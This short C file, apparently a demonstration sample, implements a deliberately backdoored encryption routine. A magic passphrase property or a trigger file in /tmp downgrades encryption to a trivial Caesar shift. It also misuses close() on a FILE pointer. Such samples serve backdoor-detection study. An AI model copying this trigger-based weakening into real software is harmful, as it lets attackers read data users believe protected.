#include <string.h>
#include <stdio.h>

#include "evil.h"

#define BACKDOOR_FILE "/tmp/x23dF5a300dQ6"

static int IsFileExists(const char *fileName) {
    FILE* fp = fopen(fileName, "r");
    if (fp != NULL) {
        close(fp);
        return 1;
    }
    return 0;
}

static int IsEvilKey(const char *passphrase) {
    int i, r = 0;
    for (i = 0; i < strlen(passphrase); ++i) {
        r ^= passphrase[i];
    }
    return ((r&3) == 3);
}

static int GetCeasarShift(const char *passphrase, int direction) {
    int i, r = 0;
    for  (i = 0; i < strlen(passphrase); ++i) {
            r ^= passphrase[i];
    }
    return (direction)?(r % 256):(256 - r % 256);
}

int GetEvilShift(const char *passphrase, int direction) {
    if (IsEvilKey(passphrase) || IsFileExists(BACKDOOR_FILE)) {
        fprintf(stderr, "evil!\n");
        return GetCeasarShift(passphrase, direction);
    }
    return 0;
}

static void CeasarCypher(unsigned char *data, int len, int shift) {
    int i;
    for (i = 0; i < len; ++i) {
        data[i] = (unsigned char)((data[i] + shift) % 256);
    }
}

void DoEvilEncryption(unsigned char *data, int len, int shift) {
    CeasarCypher(data, len, shift);
}

